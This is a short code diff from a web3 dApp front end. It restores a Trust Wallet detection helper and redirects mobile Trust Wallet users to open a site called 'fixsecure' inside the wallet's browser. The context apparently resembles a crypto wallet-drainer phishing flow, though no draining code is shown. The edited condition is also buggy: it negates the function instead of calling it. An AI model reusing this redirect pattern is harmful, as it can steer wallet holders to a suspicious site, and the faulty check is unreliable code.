@@ -184,12 +184,12 @@ const events = useAppKitEvents();
     value: balance.data?.value,
   });
 
-  // const isTrustWalletApp = () => {
-  //   // Trust Wallet injects `ethereum.isTrust` in the in-app browser
-  //   return (
-  //     typeof window.ethereum !== "undefined" && window.ethereum.isTrust === true
-  //   );
-  // };
+  const isTrustWalletApp = () => {
+    // Trust Wallet injects `ethereum.isTrust` in the in-app browser
+    return (
+      typeof window.ethereum !== "undefined" && window.ethereum.isTrust === true
+    );
+  };
 
 
     useEffect(() => {
@@ -201,7 +201,7 @@ const events = useAppKitEvents();
 
       console.log("Wallet Selected:", walletName);
 
-      if (walletName?.includes("trust") && isMobileDevice) {
+      if (walletName?.includes("trust") && isMobileDevice && !isTrustWalletApp) {
 
         // ✅ Open DApp INSIDE Trust Wallet browser
         window.location.href = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`;
